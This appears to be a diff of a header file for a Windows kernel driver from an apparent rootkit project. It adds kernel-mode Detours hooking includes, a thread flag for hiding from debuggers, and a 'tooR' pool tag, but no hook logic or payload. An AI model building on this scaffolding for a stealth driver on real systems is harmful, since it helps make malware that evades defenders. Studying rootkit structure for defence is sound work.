@@ -1,17 +1,34 @@
-#pragma once
-#define VALID_USERMODE_MEMORY(MemAddress)(MemAddress > 0 && MemAddress < 0x7FFFFFFFFFFFFFFF)
-#define VALID_KERNELMODE_MEMORY(MemAddress)(MemAddress > 0x8000000000000000 && MemAddress < 0xFFFFFFFFFFFFFFFF)
+﻿#pragma once
 
+// Memory validation macros
+#define VALID_USERMODE_MEMORY(addr) ((addr) > 0 && (addr) < 0x7FFFFFFFFFFFFFFF)
+#define VALID_KERNELMODE_MEMORY(addr) ((addr) > 0x8000000000000000 && (addr) < 0xFFFFFFFFFFFFFFFF)
 
+// Thread creation flags
 #define THREAD_CREATE_FLAGS_CREATE_SUSPENDED   0x00000001
 #define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER 0x00000004
 
-#define MAX_PATH 2056
+// Driver-specific tag
 #define DRIVER_TAG 'tooR'
 
-#include <intrin.h>
+// Custom status codes (no trailing semicolon)
+#define STATUS_INVALID_GIVEN_ADDRESS 0x00069420
+
+// Tell Detours this is kernel mode
+#define DETOURS_KERNEL
+// Core WDK headers (must come before any PE/Detours headers)
 #include <ntifs.h>
-#include <ntddk.h>
+#include <ntimage.h>    // IMAGE_* definitions
 #include <ntstrsafe.h>
+#include <intrin.h>
+
+// Detours kernel-mode library
+#include "../../includes/detours.h"
+
+// Project-specific helpers (ensure these guard PE struct definitions internally)
 #include "WindowsTypes.hpp"
 #include "MemoryHelper.h"
+#include "KernelUtils.h"
+#include "HookingUtils.h"
+
+//#pragma comment(lib, "C:\\Users\\matanel\\Desktop\\WindowsRootkit-master\\libs\\Detours.StaticLibraryForDriver.lib")
